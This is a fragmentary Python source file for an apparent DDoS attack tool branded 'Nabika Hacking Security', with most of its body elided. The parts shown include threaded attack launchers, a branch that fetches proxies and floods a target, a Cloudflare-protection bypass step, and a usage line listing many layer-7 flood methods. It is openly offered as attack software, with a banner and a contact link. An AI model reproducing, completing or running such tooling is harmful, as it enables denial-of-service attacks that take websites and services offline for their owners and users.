...
#!/usr/bin/env python3
"""
 COPYRIGHT NABIKA HACKING SECURITY
"""
...
# region testzone
def attacknabika5(target, t, threads):
    for i in range(int(threads)):
        threading.Thread(target=Launchnabika5, args=(target, t)).start()


def Launchnabika5(target, t):
...
quotes = [
  # Author
'Nabika 5.0 NabikaHackingSecurity',
'Nabika 5.0 NabikaHackingSecurity',
  f'Hey, {pcpy.get_user()}!',
...
def welcome():
  ...
  printf(Center.XCenter(Colorate.Vertical(Colors.red_to_purple, f'''
    ...
    ╔═════════╩═════════════════════════════════╩═════════╗
      ...
      > Thans Use Tool       :         Team Nabika Thanks
  
                https://zalo.me/0985245579
  ...
  while True:
    ...
    if 'credits' in cmdl:
      ...
      ╔═════════╩═════════════════════════════════╩═════════╗
        ...
        ➡ coder                :       Bảo An và Ngọc Phúc
        ➡ idea                 :     Bảo An
        ➡ team                 :       Nabika Hacking Team
      ...
      '''), True), end='')
        ...
        if get_cookie(target):
            ...
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
    elif 'nabikaddos' in cmdl or 'nabikaddos' in cmdl:
        if get_proxies():
            target, thread, t = get_info_l7()
            threading.Thread(target=attacknabika5, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif 'nabika5' in cmdl or 'nabika5' in cmdl:
        target, thread, t = get_info_l7()
...
if __name__ == '__main__':
    ...
    if len(sys.argv) < 2:
        ...
        stdout.write(
            "Method: cfb, pxcfb, cfreq, cfsoc, nabikaddos, nabika5, get, post, head, soc, pxraw, pxsoc\n")
